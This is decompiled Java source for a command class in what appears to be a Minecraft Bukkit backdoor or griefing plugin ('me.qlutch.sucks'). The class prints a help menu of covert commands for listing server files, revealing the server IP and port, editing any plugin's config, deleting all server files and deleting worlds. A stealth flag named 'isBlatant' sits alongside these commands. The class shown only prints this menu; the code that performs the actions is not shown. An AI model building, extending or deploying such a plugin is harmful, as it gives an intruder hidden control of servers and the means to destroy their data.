/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.Tips;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class FnCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        int maxPages = 1;
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("fn <1-" + maxPages + ">"));
        } else if (args[1].equalsIgnoreCase("1")) {
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            p2.sendMessage("         " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7list &8l &fList all things in the current directory."));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lsf &8l &fList all files in the current directory."));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lsd &8l &fList all directories in the current directory."));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7pwd &8l &fPrint the current directory"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7cls &8l &fClears your chat only"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7getport &8l &fGets the port of the server"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7getip &8l &fGets the ip of the server"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit &8l &fEdit the config file of any plugin"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7delallfiles &8l &fAttempts to delete all server files"));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7delworld &8l &fDeletes a world folder"));
            p2.sendMessage("");
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&8(" + Settings.DARK_RED + "Tip&8) l &7" + Tips.getTip())));
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

